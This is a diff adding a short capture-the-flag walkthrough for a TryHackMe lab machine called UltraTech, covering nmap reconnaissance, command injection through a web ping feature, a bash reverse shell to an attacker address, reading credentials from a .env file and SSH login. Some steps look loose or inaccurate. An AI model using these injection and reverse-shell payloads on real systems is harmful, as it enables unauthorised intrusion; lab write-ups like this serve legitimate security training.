@@ -1,0 +1,61 @@
+----------------                               ------------------
+               :::::::::::;| ULTRATECH |;::::::::::::
+
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "ULTRATECH".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 3 ports (21/FTP, 8081/HTTP, 31331/CUSTOM?)
+
+3. What's on port 8081?
+ANS: UltraTech dashboard with "ping" feature!
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. TEST PING FEATURE.
+
+    http://<ip>:8081/ping
+    "Try: 127.0.0.1; ls"
+    "COMMAND INJECTION WORKS!"
+
+2. GET REVERSE SHELL.
+
+    nc -lvnp 4444
+    "Run: 127.0.0.1; bash -c 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1'"
+    "WE'RE IN AS WWW-DATA!"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. FIND USER CREDS.
+
+    cat /var/www/ultratech/.env
+    "FOUND: r00t:thisisagoodpassword"
+
+2. SSH ACCESS.
+
+    ssh r00t@<ip>
+    Password: thisisagoodpassword
+    "WE'RE R00T! (LOL EASY!)"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/r00t/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- ULTRATECH OWNED ----------
